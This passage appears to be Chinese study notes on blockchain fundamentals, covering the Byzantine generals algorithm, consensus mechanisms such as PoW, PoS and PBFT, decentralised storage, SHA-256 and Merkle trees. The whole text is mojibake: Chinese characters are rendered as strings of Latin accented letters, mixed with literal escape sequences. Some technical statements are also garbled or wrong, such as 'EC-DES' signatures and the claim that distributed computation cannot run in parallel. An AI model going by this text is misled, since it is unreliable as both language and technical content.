ä¸åœ¨é›†åˆVi ä¸­åˆ™ ï¼ˆiï¼‰æ·»åŠ v åˆ°Vi ï¼ˆiiï¼‰å¦‚æœk\u003cm ï¼Œé‚£ä¹ˆå‘é€v:0:j1:...:jk:i ç»™æ¯ä¸ªä¸åœ¨j1,..,jk ä¸­çš„å‰¯å®˜ ï¼ˆ3ï¼‰å¯¹äºæ¯ä¸ªå‰¯å®˜i ï¼Œå½“ä¸å†æ”¶åˆ°æ¶ˆæ¯ï¼Œåˆ™éµå®ˆå‘½ä»¤choice(Vi) åŸºäºç­¾åæ¶ˆæ¯çš„ç®—æ³•è¯æ˜ å®šç†2ï¼šå¯¹äºä»»æ„mï¼Œæœ€å¤šåªæœ‰m ä¸ªèƒŒå›è€…æƒ…å†µä¸‹ï¼Œç®—æ³•SM(m) è§£å†³æ‹œå åº­å°†å†›é—®é¢˜ã€‚\nåŒºå—é“¾ä¸åˆ†å¸ƒå¼ç³»ç»Ÿ  åŒºå—é“¾çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªç‚¹å¯¹ç‚¹çš„åˆ†å¸ƒå¼è´¦æœ¬ï¼Œæ­¤ç±»è´¦æœ¬å…·æœ‰åŠ å¯†å®‰å…¨æ€§ï¼Œä¸”ä»…å¯è¿½åŠ å†…å®¹ï¼ŒåŒæ—¶ä¸å¯æ›´æ”¹ï¼ˆå¾ˆéš¾ï¼‰ï¼Œåªæœ‰åœ¨å¯¹ç­‰èº«ä»½æˆå‘˜ä¹‹é—´è¾¾æˆå…±è¯†æˆ–åè®®æ—¶æ‰èƒ½æ›´æ–° åŒºå—é“¾å¯ä»¥å®šä¹‰ä¸ºä¸€ä¸ªå¹³å°ï¼Œåœ¨æ­¤å¹³å°ä¸Šï¼Œå¯¹ç­‰ç‚¹å¯ä»¥é€šè¿‡äº¤æ˜“äº¤æ¢å€¼ï¼Œè€Œä¸éœ€è¦ä¸­å¤®ä¿¡ä»»ä»²è£è€…ã€‚  ä¸€è‡´æ€§ ä¸€è‡´æ€§æ˜¯æŒ‡ä¸ä¿¡ä»»èŠ‚ç‚¹ä¹‹é—´çš„åè®®è¿‡ç¨‹ã€‚\n ä¸€è‡´æ€§æœºåˆ¶æ‰€éœ€æ»¡è¶³çš„éœ€æ±‚ï¼š\n åè®®ï¼šå…¨éƒ¨å¯ä¿¡èŠ‚ç‚¹åˆ¶å®šåŒä¸€å€¼ æœ‰æ•ˆæ€§ï¼šæ‰€æœ‰å¯ä¿¡èŠ‚ç‚¹çš„å•†å®šå€¼å¿…é¡»ä¸è‡³å°‘ä¸€ä¸ªèŠ‚ç‚¹æ‰€æè®®çš„åˆå§‹å€¼ç›¸åŒ å®¹é”™æ€§ï¼šä¸€è‡´æ€§ç®—æ³•åº”åœ¨èƒ½å‡ºç°æ•…éšœæˆ–æ¶æ„èŠ‚ç‚¹çš„æƒ…å†µä¸‹è¿è¡Œ å®Œæ•´æ€§ï¼šä»»ä½•èŠ‚ç‚¹éƒ½ä¸å¯èƒ½åšå¤šæ¬¡å†³ç­–   ä¸€è‡´æ€§æœºåˆ¶çš„ç±»å‹ï¼š\n åŸºäºæ‹œå åº­å¼çš„å®¹é”™ï¼šä¸å­˜åœ¨è®¡ç®—å¯†é›†å‹æ“ä½œï¼Œä¾èµ–äºä¸€ä¸ªç®€å•çš„ã€å‘å¸ƒç­¾åæ¶ˆæ¯çš„èŠ‚ç‚¹æ–¹æ¡ˆ åŸºäºé¢†å¯¼çš„ä¸€è‡´æ€§æœºåˆ¶ï¼šèŠ‚ç‚¹å®ç°é¢†å¯¼é€‰ä¸¾æœºåˆ¶ï¼Œç”±è·èƒœèŠ‚ç‚¹æä¾›ç»“æœå€¼  åŒºå—é“¾çš„ä¸€èˆ¬å…ƒç´   åœ°å€ï¼šè¡¨ç¤ºäº‹åŠ¡ä¸­æ”¶ä»¶äººå’Œå‘ä»¶äººçš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œé€šå¸¸è¡¨ç¤ºä¸ºå…¬é’¥æˆ–æ´¾ç”Ÿè‡ªç§é’¥ã€‚å»ºè®®åœ¨æ¯ä¸ªäº‹åŠ¡ä¸­ç”¨æ–°ç”Ÿæˆçš„åœ°å€ï¼Œé˜²æ­¢å°†äº¤æ˜“é“¾æ¥åˆ°å…¬å…±æ‰€æœ‰è€…ï¼Œé¿å…èº«ä»½è¯†åˆ« äº‹åŠ¡ï¼šåŒºå—é“¾çš„åŸºæœ¬å•å…ƒï¼Œè¡¨ç¤ºåœ°å€é—´çš„å€¼ä¼ è¾“ åŒºå—ï¼šç”±å¤šä¸ªäº¤æ˜“å’Œå…¶ä»–å…ƒç´ ç»„æˆ P2Pç½‘ç»œï¼šæ‰€æœ‰å¯¹ç­‰ç‚¹ä¹‹é—´çš„å¯ä»¥å½¼æ­¤é€šä¿¡ã€å‘é€å’Œæ¥æ”¶æ¶ˆæ¯ è„šæœ¬æˆ–ç¨‹åºè¯­è¨€ï¼šäº¤æ˜“è„šæœ¬æ˜¯èŠ‚ç‚¹çš„é¢„å®šä¹‰é›†åˆï¼Œç”¨äºå°†ä»¤ç‰Œä»ä¸€ä¸ªåœ°å€è½¬ç§»åˆ°å¦ä¸€ä¸ªåœ°å€ï¼Œå¹¶æ‰§è¡Œå„ç§å…¶ä»–åŠŸèƒ½ è™šæ‹Ÿæœºï¼šäº‹åŠ¡è„šæœ¬çš„æ‰©å±•ï¼Œå¯è¿è¡Œå›¾çµå®Œå¤‡çš„ä»£ç  çŠ¶æ€æœºï¼šä¸€ä¸ªåŒºå—é“¾å¯ä»¥çœ‹ä½œä¸€ä¸ªçŠ¶æ€è½¬æ¢æœºåˆ¶ èŠ‚ç‚¹ï¼šå¯ä»¥ç”Ÿæˆå¹¶éªŒè¯äº¤æ˜“ï¼ŒåŒæ—¶è¿›è¡ŒæŒ–æ˜ã€‚æ ¹æ®åŒºå—é“¾ç±»å‹åŠèŠ‚ç‚¹åˆ†é…çš„è§’è‰²ï¼Œè¿˜å¯ä»¥æ‰§è¡Œå…¶ä»–åŠŸèƒ½ æ™ºèƒ½åˆçº¦ï¼šæ™ºèƒ½åˆçº¦è¿è¡ŒäºåŒºå—é“¾ä¹‹ä¸Šï¼Œåœ¨æ»¡è¶³æŸäº›æ¡ä»¶æ—¶å°è£…ä¸šåŠ¡ã€‚åŒºå—é“¾å¹¶ä¸æ”¯æŒæ™ºèƒ½åˆçº¦  åŒºå—é“¾çš„ç‰¹æ€§  **åˆ†å¸ƒå¼ä¸€è‡´æ€§ï¼š**ç¼ºå°‘ä¸­å¿ƒä¿¡ä»»æœºåˆ¶æˆæƒçš„æƒ…å†µä¸‹ï¼Œå„æ–¹éƒ½èƒ½è¾¾æˆä¸€è‡´ **äº¤æ˜“éªŒè¯ï¼š**èŠ‚ç‚¹å‘å¸ƒäº¤æ˜“åŸºäºé¢„å…ˆç¡®å®šçš„è§„åˆ™è¿›è¡ŒéªŒè¯ï¼Œæœ‰æ•ˆçš„äº¤æ˜“æ‰èƒ½åŒ…å«åœ¨åŒºå—ä¸­ **æ™ºèƒ½åˆçº¦å¹³å°ï¼š**åŒºå—é“¾å®šä¹‰ä¸ºä¸€ä¸ªå¹³å°ï¼Œç¨‹åºå¯ä»¥è¿è¡Œå…¶ä¸Šï¼Œå¹¶ä»£è¡¨ç”¨æˆ·æ‰§è¡Œä¸šåŠ¡é€»è¾‘ **åœ¨å¯¹ç­‰ç‚¹é—´ä¼ è¾“å€¼ï¼š**å…è®¸é€šè¿‡ä»¤ç‰Œåœ¨ç”¨æˆ·ä¹‹é—´ä¼ é€’å€¼ï¼Œä»¤ç‰Œæ˜¯å€¼çš„è½½ä½“ **ç”ŸæˆåŠ å¯†è´§å¸ï¼š**æ˜¯ä¸€ä¸ªå¯é€‰çš„ç‰¹æ€§ï¼Œä¸ºçš„æ˜¯æ¿€åŠ±çŸ¿å•† **æ™ºèƒ½å±æ€§ï¼š**é‡‡ç”¨ä¸å¯æ’¤é”€çš„æ–¹å¼å°†èµ„äº§ä¸åŒºå—é“¾è”ç³»èµ·æ¥ï¼Œä½¿ä»»ä½•äººéƒ½æ— æƒå æœ‰ã€èµ„äº§å®Œå…¨ç”±ä¸ªäººæ§åˆ¶ã€ä¸å¯é‡å¤ä½¿ç”¨æˆ–åŒé‡æ‹¥æœ‰ **å®‰å…¨æä¾›å•†ï¼š**åŸºäºå·²è¯å®çš„åŠ å¯†æŠ€æœ¯ï¼Œç¡®ä¿æ•°æ®çš„å®Œæ•´æ€§å’Œå¯ç”¨æ€§ **ä¸å˜æ€§ï¼š**åŒºå—é“¾ä¸­çš„è®°å½•æ˜¯ä¸å¯å˜çš„ **å”¯ä¸€æ€§ï¼š**æ¯ä¸ªäº¤æ˜“éƒ½æ˜¯å”¯ä¸€çš„ï¼Œä¸”å°šæœªè¢«æ¶ˆè´¹ **æ™ºèƒ½åˆçº¦ï¼š**åŒºå—é“¾æä¾›äº†ä¸€ä¸ªæœ‰æ™ºèƒ½åˆçº¦ç‰¹æ€§çš„å¹³å°ï¼Œå¯è§†ä¸ºåŒºå—é“¾ä¸Šçš„è‡ªä¸»ç¨‹åºï¼Œå¯ä»¥å°è£…ä¸šåŠ¡é€»è¾‘å’Œä»£ç ï¼Œä»¥ä¾¿ä¸‹ä¸€æ­¥æ‰€éœ€ã€‚æ™ºèƒ½åˆçº¦åŒæ—¶å®ç°äº†çµæ´»æ€§ã€å¯ç¼–ç¨‹æ€§ã€å¯¹äºç‰¹å®šä¸šåŠ¡æ‰§è¡Œçš„ç‰¹å®šæ“ä½œï¼ŒåŒºå—é“¾ç”¨æˆ·å¯å¯¹æ­¤åŠ ä»¥æ§åˆ¶  åŒºå—é“¾ä¸­çš„å…±è¯†   å·¥ä½œé‡è¯æ˜æœºåˆ¶ï¼ˆPoWï¼‰\nä¾èµ–äºï¼šåœ¨æå‡ºä¸€ä¸ªç½‘ç»œæ¥å—ä»·å€¼ä¹‹å‰å·²ç»èŠ±è´¹é¥¿äº†è¶³å¤Ÿçš„è®¡ç®—èµ„æºã€‚ç”¨äºæ¯”ç‰¹å¸å’Œå…¶ä»–åŠ å¯†è´§å¸ã€‚\n  æƒç›Šè¯æ˜(PoS)\nç†å¿µï¼šèŠ‚ç‚¹æˆ–ç”¨æˆ·åœ¨ç³»ç»Ÿä¸­å…·æœ‰è¶³å¤Ÿçš„æƒç›Šã€‚å¦‚ç”¨æˆ·åœ¨ç³»ç»Ÿä¸­æŠ•å…¥äº†è¶³å¤Ÿçš„èµ„é‡‘ï¼Œå› æ­¤ï¼Œæ¶æ„è¡Œä¸ºè·å¾—çš„æ”¶ç›Šå°†è¶…å‡ºæ‰§è¡Œç³»ç»Ÿæ”»å‡»ã€‚åº”ç”¨äºä»¥å¤ªåŠåŒºå—é“¾ä¸­ï¼Œç”Ÿæˆå¹¶ç­¾è®¢ä¸‹ä¸€ä¸ªåŒºå—çš„æœºä¼šéšç€å¸é¾„è€Œå¢åŠ ã€‚\n  å§”æ‰˜æƒç›Šè¯æ˜(DPoS)\nå¯¹PoSçš„ä¸€ç§åˆ›æ–°ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½å¯ä»¥é€šè¿‡æŠ•ç¥¨å°†äº¤æ˜“çš„éªŒè¯å§”æ‰˜ç»™å…¶ä»–èŠ‚ç‚¹ã€‚åº”ç”¨äºæ¯”ç‰¹è‚¡ä¸­ã€‚\n  æµé€æ—¶é—´è¯æ˜\nä½¿ç”¨å¯ä¿¡æ‰§è¡Œç¯å¢ƒï¼ˆTEEï¼‰é€šè¿‡å¯é çš„ç­‰å¾…æ—¶é—´å†é¢†å¯¼é€‰ä¸¾è¿‡ç¨‹ä¸­æä¾›éšæœºæ€§å’Œå®‰å…¨æ€§ã€‚\n  åŸºäºä¿è¯é‡‘çš„å…±è¯†\nå¸Œæœ›åŠ å…¥ç½‘ç»œçš„èŠ‚ç‚¹åœ¨ç”ŸæˆåŒºå—é“¾ä¹‹å‰å­˜å…¥ä¿è¯é‡‘ã€‚\n  é‡è¦æ€§è¯æ˜\nä¾èµ–äºç”¨æˆ·åœ¨ç³»ç»Ÿä¸­æ‰€æ‹¥æœ‰çš„æƒç›Šä»½é¢ï¼Œå¹¶ç›‘è§†ç”¨æˆ·å¯¹ä»¤ç‰Œçš„ä½¿ç”¨å’Œç§»åŠ¨ï¼Œä»¥å»ºç«‹ä¿¡ä»»å’Œé‡è¦æ€§çº§åˆ«ã€‚\n  è”é‚¦å…±è¯†å’Œè”é‚¦æ‹œå åº­å…±è¯†\nåº”ç”¨äºæ’æ˜Ÿå…±è¯†åè®®ä¸­ï¼Œä¿ç•™ä¸€ç»„å…¬å¼€ä¿¡ä»»çš„å¯¹ç­‰ç‚¹ï¼Œå¹¶åªä¼ æ’­ç”±å¤§å¤šæ•°å—ä¿¡èŠ‚ç‚¹éªŒè¯çš„äº¤æ˜“ã€‚\n  ä¿¡èª‰æœºåˆ¶\nåŸºäºåœ¨ç½‘ç»œä¸Šå»ºç«‹çš„å£°èª‰é€‰æ‹©é¢†å¯¼è€…ï¼Œç”±å…¶ä»–æˆå‘˜æŠ•ç¥¨å®ç°ã€‚\n  å®ç”¨æ‹œå åº­å®¹é”™æœºåˆ¶(PBFT)\nå®ç°äº†çŠ¶æ€æœºçš„å¤åˆ¶ï¼Œå¹¶å¯¹æ‹œå åº­èŠ‚ç‚¹æä¾›äº†å®¹é”™æœºåˆ¶ã€‚\n  åŸºäºåŒºå—é“¾çš„å»ä¸­å¿ƒåŒ–  **åˆ†å¸ƒå¼ç³»ç»Ÿï¼š**æ•°æ®å’Œè®¡ç®—æ˜¯åˆ†å¸ƒåœ¨å¤šä¸ªèŠ‚ç‚¹ä¸Šï¼Œè®¡ç®—ä¸å¯èƒ½ä»¥å¹¶è¡Œæ–¹å¼æ‰§è¡Œï¼Œæ•°æ®ä»…å¯åœ¨ç”¨æˆ·è§†ä¸ºå•ä¸€èšåˆç³»ç»Ÿçš„å¤šä¸ªèŠ‚ç‚¹ä¸Šè¿›è¡Œå¤åˆ¶ã€‚\n**å¹¶è¡Œç³»ç»Ÿï¼š**è®¡ç®—æ˜¯ç”±æ‰€æœ‰èŠ‚ç‚¹åŒæ­¥æ‰§è¡Œã€‚\n  åˆ†å¸ƒå¼ç³»ç»Ÿï¼šå­˜åœ¨ç®¡ç†æ•´ä¸ªç³»ç»Ÿçš„ä¸­å¤®æƒå¨æœºæ„ï¼Œæ§åˆ¶æƒåˆ†å¸ƒåœ¨è®¸å¤šèŠ‚ç‚¹ä¸­ã€‚\n**å»ä¸­å¿ƒåŒ–ç³»ç»Ÿï¼š**æ˜¯èŠ‚ç‚¹ä¸ä¾èµ–ä¸å•ä¸ªä¸»èŠ‚ç‚¹çš„ç½‘ç»œç±»å‹ï¼Œä¸”ä¸å­˜åœ¨ä¸­å¤®æƒå¨æœºæ„ã€‚\n å»ä¸­å¿ƒåŒ–æ–¹æ³• å­˜åœ¨ä¸¤ç§æ–¹æ³•å®ç°å»ä¸­å¿ƒåŒ–ï¼šéä¸­ä»‹åŒ–å’Œç«äº‰\néä¸­ä»‹åŒ–ï¼šä¸é€šè¿‡ä¸­ä»‹æœºæ„è¿›è¡Œç›¸åº”çš„æ´»åŠ¨ï¼Œæˆ–æ¶ˆé™¤ä¸­é—´äººæˆ–ä¸­ä»‹æœºæ„ï¼Œå¦‚C2Cæ¨¡å¼ï¼›ä¸é€šè¿‡é“¶è¡Œè½¬è´¦ï¼Œè€Œç”¨åŒºå—é“¾åœ°å€è¿›è¡Œç›´æ¥è½¬è´¦\nç«äº‰ï¼šä¸€ç»„æœåŠ¡æä¾›è€…ç›¸äº’ç«äº‰ï¼Œä»¥ä¾¿è¢«ç³»ç»Ÿé€‰æ‹©è¿›è€Œæä¾›æœ‰æ•ˆæœåŠ¡ã€‚åœ¨åŒºå—é“¾ç³»ç»Ÿä¸­ï¼Œæ™ºèƒ½åˆçº¦å¯ä»¥æ ¹æ®å£°èª‰ã€è¯„åˆ†ã€è¯„è®ºå’ŒæœåŠ¡è´¨é‡ï¼Œä»å¤§é‡çš„æä¾›è€…ä¸­é€‰æ‹©ä¸€ä¸ªå¤–éƒ¨çš„æ•°æ®æä¾›è€…ã€‚å½“ç„¶è¿™å¹¶ä¸æ˜¯å®Œå…¨çš„å»ä¸­å¿ƒåŒ–ï¼Œä½†å…è®¸æ™ºèƒ½åˆçº¦æ ¹æ®æ ‡å‡†ä½œå‡ºè‡ªç”±é€‰æ‹©\nå»ä¸­å¿ƒåŒ–æµç¨‹ ä¸æ˜¯æ‰€æœ‰çš„äº‹åŠ¡éƒ½éœ€è¦å»ä¸­å¿ƒåŒ–çš„\n å»ä¸­å¿ƒåŒ–éœ€æ±‚æ¡ä»¶è¯„ä¼°ï¼š\n  å»ä¸­å¿ƒåŒ–çš„å«ä¹‰\nå»ä¸­å¿ƒåŒ–ç³»ç»Ÿå¯ä»¥æ˜¯ä»»ä½•ç³»ç»Ÿ\n  å»ä¸­å¿ƒåŒ–æ‰€éœ€çš„çº§åˆ«\n  å¯ä»¥æ˜¯å®Œå…¨ä¸­ä»‹åŒ–æˆ–éƒ¨åˆ†ä¸­ä»‹åŒ–\n  é‡‡ç”¨å“ªç§åŒºå—é“¾\nå¯ä»¥é€‰æ‹©æ¯”ç‰¹å¸ã€ä»¥å¤ªåŠç­‰\n  é‡‡ç”¨å“ªç§å®‰å…¨æ€§æœºåˆ¶\nåŸå­æ€§æœºåˆ¶ï¼Œç¡®ä¿ç³»ç»Ÿçš„å®Œæ•´æ€§ï¼›å£°èª‰æœºåˆ¶ï¼Œæ”¯æŒç³»ç»Ÿä¸­ä¸åŒçš„å—ä¿¡åº¦\n   åŒºå—é“¾å’Œå®Œæ•´çš„ç”Ÿæ€åœˆå»ä¸­å¿ƒåŒ–æ“ä½œ å»ä¸­å¿ƒåŒ–çš„ç”Ÿæ€ç³»ç»Ÿæ¦‚è§ˆå¦‚ä¸‹ï¼š\nå­˜å‚¨ æ•°æ®å¯ä»¥ç›´æ¥å­˜å‚¨åœ¨åŒºå—é“¾ä¸­ï¼Œå³å®ç°äº†å»ä¸­å¿ƒåŒ–æ“ä½œï¼Œä½†å­˜åœ¨ä¸€ä¸ªç¼ºç‚¹ï¼šåŒºå—é“¾ä¸é€‚åˆå­˜å‚¨å¤§é‡çš„æ•°æ®ï¼Œå¦‚å›¾åƒã€‚\nå»ä¸­å¿ƒåŒ–å­˜å‚¨æ–¹æ¡ˆï¼š\n  **åˆ†å¸ƒå¼å“ˆå¸Œè¡¨ï¼ˆDHTï¼‰ï¼š**åº”ç”¨äºBitTorrentï¼Œç”¨æˆ·ä¸ä¼šæ— é™æœŸçš„ä¿å­˜ç›¸å…³æ–‡ä»¶ï¼Œå¦‚æœèŠ‚ç‚¹è„±ç¦»ç½‘ç»œï¼Œåˆ™èŠ‚ç‚¹æ— æ³•è¢«æ£€ç´¢åˆ°ï¼Œé™¤éè¯¥èŠ‚ç‚¹å†æ¬¡åŠ å…¥åˆ°ç½‘ç»œï¼Œä»¥ä½¿æ–‡ä»¶å†æ¬¡å¯ç”¨ã€‚\n  **Inter Planetary File Systemï¼ˆIPFSï¼‰**æ‹¥æœ‰é«˜å¯ç”¨æ€§å’Œé“¾æ¥ç¨³å®šæ€§ï¼Œæ—¨åœ¨é€šè¿‡æ›¿æ¢HTTPåè®®æä¾›ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„ä¸‡ç»´ç½‘ã€‚ä½¿ç”¨Kademlia DHTå’Œmerkle DAGï¼ˆæœ‰å‘æ— ç¯å›¾ï¼‰åˆ†åˆ«æä¾›å­˜å‚¨å’Œæœç´¢åŠŸèƒ½ã€‚\n  æ¿€åŠ±æœºåˆ¶åŸºäºFilecoinåè®®ï¼Œè¯¥åè®®å‘ä½¿ç”¨BitSwapæœºåˆ¶å­˜å‚¨æ•°æ®çš„èŠ‚ç‚¹æä¾›æ¿€åŠ±ã€‚ BitSwapæœºåˆ¶å…è®¸èŠ‚ç‚¹ä¿ç•™ä¸€ä¸ªç®€å•çš„å­—èŠ‚è´¦æœ¬ã€‚\n  EthereumåŒ…å«è‡ªèº«çš„å»ä¸­å¿ƒåŒ–å’Œåˆ†å¸ƒå¼çš„ç”Ÿæ€ç³»ç»Ÿï¼Œå¹¶ä½¿ç”¨é›†ç¾¤å­˜å‚¨å’Œwhisperåè®®è¿›è¡Œé€šä¿¡ã€‚\n  Maidsafeè‡´åŠ›äºæä¾›ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„ä¸‡ç»´ç½‘ã€‚\n  BigChainDBç›®çš„æ˜¯æä¾›ä¸€ä¸ªå¯ä¼¸ç¼©ã€å¿«é€Ÿå’Œçº¿æ€§å’Œä¼¸ç¼©çš„å»ä¸­å¿ƒåŒ–æ•°æ®åº“ï¼Œè€Œä¸æ˜¯ä¼ ç»Ÿçš„æ–‡ä»¶ç³»ç»Ÿã€‚\n  é€šä¿¡ å»ä¸­å¿ƒåŒ–ç½‘ç»œæ–¹æ¡ˆï¼š\n  Internetæ—¨åœ¨å»ºç«‹ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„ç³»ç»Ÿã€‚è¯¥æ¨¡å‹åŸºäºä¸­å¤®æƒå¨ï¼ˆæœåŠ¡æä¾›è€…ï¼‰çš„ä¿¡ä»»ï¼Œç”¨æˆ·å¹¶ä¸è´Ÿè´£ç®¡ç†å…¶æ•°æ®ï¼Œç”šè‡³å¯†ç ä¹Ÿå¯å­˜å‚¨åœ¨å—ä¿¡çš„ç¬¬ä¸‰æ–¹ç³»ç»Ÿä¸Šã€‚æœ‰å¿…è¦ä»¥æŸç§æ–¹å¼å‘ä¸ªåˆ«ç”¨æˆ·æä¾›ç®¡ç†æƒé™ï¼Œç¡®ä¿ç”¨æˆ·å¯ä»¥è®¿é—®æ•°æ®ï¼Œå¹¶ä¸”ä¸ä¾èµ–äºç¬¬ä¸‰æ–¹ã€‚ï¼ˆå¦‚IPFSï¼‰\n  **ç½‘çŠ¶ç½‘ç»œï¼š**èŠ‚ç‚¹é—´å¯ä»¥ç›´æ¥å¯¹è¯ï¼Œè€Œä¸éœ€è¦åƒæœåŠ¡æä¾›å•†é‚£æ ·é‡‡ç”¨ä¸­å¿ƒæ¢çº½ã€‚ä¾‹å¦‚Firechatï¼Œå…è®¸iphoneç”¨æˆ·åœ¨æ²¡æœ‰äº’è”ç½‘çš„æƒ…å†µä¸‹ä»¥ç‚¹å¯¹ç‚¹çš„æ–¹å¼ç›´æ¥è¿›è¡Œé€šä¿¡ã€‚\n  å¯†ç å­¦ä¸åŸºæœ¬æŠ€æœ¯ åŒºå—é“¾çš„ä¸å¯ç¯¡æ”¹æ€§åŸºäºå¯†ç å­¦çš„ç®—æ³•å®ç°\n  å¯†ç å­¦å‘å±•ç®€å²   å¯†ç å­¦æ•°å­¦åŸºç¡€   å¯¹ç§°å¯†ç æœºåˆ¶   éå¯¹ç§°å¯†ç æœºåˆ¶   HashæŠ€æœ¯ å“ˆå¸Œå‡½æ•°ç”¨äºåˆ›å»ºä»»æ„é•¿åº¦çš„è¾“å…¥å­—ç¬¦ä¸²ã€å›ºå®šé•¿åº¦çš„æ–‡æ‘˜ï¼Œæ‰€ä»¥å¸¸ç”¨äºæ•°å­—ç­¾åå’Œæ¶ˆæ¯è®¤è¯ç ä¸­ã€‚\n SHA256ï¼šè¾“å…¥æ¶ˆæ¯å¤§å°å°äº264ä½ã€‚å…¶ä¸­ï¼Œå—å¤§å°ä¸º512ä½ï¼Œå­—å¤§å°ä¸º32ä½ï¼Œè¾“å‡ºä¸º256ä½çš„æ–‡æ‘˜ã€‚\n é¢„å¤„ç†ç®—æ³•ï¼š  a) å¦‚æœå°äº512ä½å—å°ºå¯¸ï¼Œå¡«å……ä¸º512ä½å—å°ºå¯¸ã€‚\nb) å°†æ¶ˆæ¯è§£æä¸ºæ¶ˆæ¯å—ï¼Œç¡®ä¿æ¶ˆæ¯åŠå…¶å¡«å……å†…å®¹åˆ’åˆ†ä¸º512ä½çš„ç›¸ç­‰å¿«ã€‚\nc) è®¾ç½®åˆå§‹å“ˆå¸Œå€¼ï¼Œè¡¨ç¤ºä¸º8ä¸ª32ä½çš„å­—ï¼Œæ˜¯å‰8ä¸ªç´ æ•°çš„å¹³æ–¹æ ¹å°æ•°çš„å‰32ä½ã€‚\n å“ˆå¸Œè®¡ç®—æ­¥éª¤ï¼š  a) æ¯ä¸ªæ¶ˆæ¯å—ä¾æ¬¡è¿›è¡Œå¤„ç†ï¼Œéœ€è¦64è½®æ‰èƒ½è®¡ç®—å‡ºå…¨éƒ¨å“ˆå¸Œç»“æœã€‚å…¶ä¸­ï¼Œæ¯ä¸€è½®ä½¿ç”¨ä¸åŒçš„å¸¸æ•°ï¼Œä»¥ç¡®ä¿æ²¡æœ‰ä¸¤è½®å¤„äºç­‰åŒçŠ¶æ€ã€‚\nb) è®¾ç½®æ¶ˆæ¯è½®è¯¢ã€‚\nc) åˆå§‹åŒ–8ä¸ªå·¥ä½œå˜é‡ã€‚\nd) è®¡ç®—ä¸­é—´å“ˆå¸Œå€¼ã€‚\ne) å¤„ç†æ¶ˆæ¯å¹¶ç”Ÿæˆè¾“å‡ºå“ˆå¸Œå€¼ã€‚\n   â€‹ åœ¨p2pç½‘ç»œä¸‹è½½ç½‘ç»œä¹‹å‰ï¼Œå…ˆä»å¯ä¿¡çš„æºè·å¾—æ–‡ä»¶çš„Merkle Treeæ ‘æ ¹ã€‚ä¸€æ—¦è·å¾—äº†æ ‘æ ¹ï¼Œå°±å¯ä»¥ä»å…¶ä»–ä¸å¯ä¿¡çš„æºè·å–Merkle treeã€‚é€šè¿‡å¯ä¿¡çš„æ ‘æ ¹æ¥æ£€æŸ¥æ¥å—åˆ°çš„Merkle Treeã€‚å¦‚æœMerkle Treeæ˜¯æŸåçš„æˆ–è€…è™šå‡çš„ï¼Œå°±ä»å…¶ä»–æºè·å¾—å¦ä¸€ä¸ªMerkle Treeï¼Œç›´åˆ°è·å¾—ä¸€ä¸ªä¸å¯ä¿¡æ ‘æ ¹åŒ¹é…çš„Merkle Treeã€‚\n  ç‰¹ç‚¹ï¼š\n MTå¤§å¤šæ•°æ˜¯äºŒå‰æ ‘ï¼Œä¹Ÿå¯ä»¥å¤šå‰æ ‘ï¼Œå…·æœ‰æ ‘ç»“æ„çš„æ‰€æœ‰ç‰¹ç‚¹ å¶å­èŠ‚ç‚¹çš„valueæ˜¯æ•°æ®é›†åˆçš„å•å…ƒæ•°æ®æˆ–è€…å•å…ƒæ•°æ®HASH éå¶å­èŠ‚ç‚¹çš„valueæ˜¯æ ¹æ®å®ƒä¸‹é¢æ‰€æœ‰çš„å¶å­èŠ‚ç‚¹å€¼ï¼Œç„¶åæŒ‰ç…§Hashç®—æ³•è®¡ç®—è€Œå¾—å‡ºçš„    ä¼˜ç‚¹ï¼šå¯ä»¥ç›´æ¥ä¸‹è½½å¹¶ç«‹å³éªŒè¯Merkle Treeçš„ä¸€ä¸ªåˆ†æ”¯ã€‚å› ä¸ºå¯ä»¥å°†æ–‡ä»¶åˆ‡åˆ†æˆå°çš„æ•°æ®å—ï¼Œè¿™æ ·å¦‚æœæœ‰ä¸€å—æ•°æ®æŸåï¼Œä»…ä»…é‡æ–°ä¸‹è½½è¿™ä¸ªæ•°æ®å—å°±è¡Œäº†ã€‚\n  åŸºæœ¬å¯†ç æŠ€æœ¯çš„åº”ç”¨   EC-DHäº¤æ¢å¯†é’¥\nEC-DESç­¾å\nå…±è¯†ç®—æ³•  å¯å‚è€ƒï¼š\n[åŒºå—é“¾] å…±è¯†ç®—æ³•ä¹‹äº‰(PBFTï¼ŒRaftï¼ŒPoWï¼ŒPoSï¼ŒDPoSï¼ŒRipple)\næ·±å…¥æµ…å‡ºPBFTç®—æ³•åŸç†\n å…±è¯†æœºåˆ¶ åŒºå—é“¾çš„åº•å±‚ç”±å››éƒ¨åˆ†æ„æˆ\n åˆ†å¸ƒå¼æ•°æ®åº“ï¼šç”¨æ¥å­˜å‚¨ä»¥å¾€å’Œå°†æ¥çš„äº¤æ˜“æ•°æ® å¯†ç å­¦ï¼šå…¬é’¥ç§é’¥ä½“ç³»ç”¨æ¥ç¡®è®¤äº¤æ˜“åŒæ–¹çš„èº«ä»½ P2Pç½‘ç»œï¼šç”¨æ¥å¹¿æ’­å’Œè”“å»¶å„ç±»æ¶ˆæ¯ï¼ˆå¦‚èŠ‚ç‚¹çš„åŠ å…¥æ¶ˆæ¯ã€èŠ‚ç‚¹å¤±æ•ˆæ¶ˆæ¯ã€å¾—åˆ°æŒ–çŸ¿æ•°æ®çš„æ¶ˆæ¯ï¼‰ å…±è¯†æœºåˆ¶ï¼šç”¨æ¥å†³å®šèŠ‚ç‚¹è®°è´¦æƒåˆ©  åŒºå—é“¾ç³»ç»Ÿçš„æ ¸å¿ƒæ˜¯ç³»ç»ŸèŠ‚ç‚¹ç«äº‰è®°è´¦ï¼Œè¿™ä¸ªç«äº‰è¿‡ç¨‹ç§°ä¸ºå…±è¯†æœºåˆ¶\nå…±è¯†æœºåˆ¶åœ¨åŒºå—é“¾ä¸­æ‰®æ¼”ç€æ ¸å¿ƒåœ°ä½ï¼Œå…±è¯†æœºåˆ¶å†³å®šäº†è°æœ‰è®°è´¦çš„æƒåˆ©ï¼Œä»¥åŠè®°è´¦æƒåˆ©çš„é€‰æ‹©è¿‡ç¨‹å’Œç†ç”±\n å…±è¯†æœºåˆ¶ï¼šåŒºå—é“¾äº‹åŠ¡è¾¾æˆåˆ†å¸ƒå¼å…±è¯†çš„ç®—æ³•  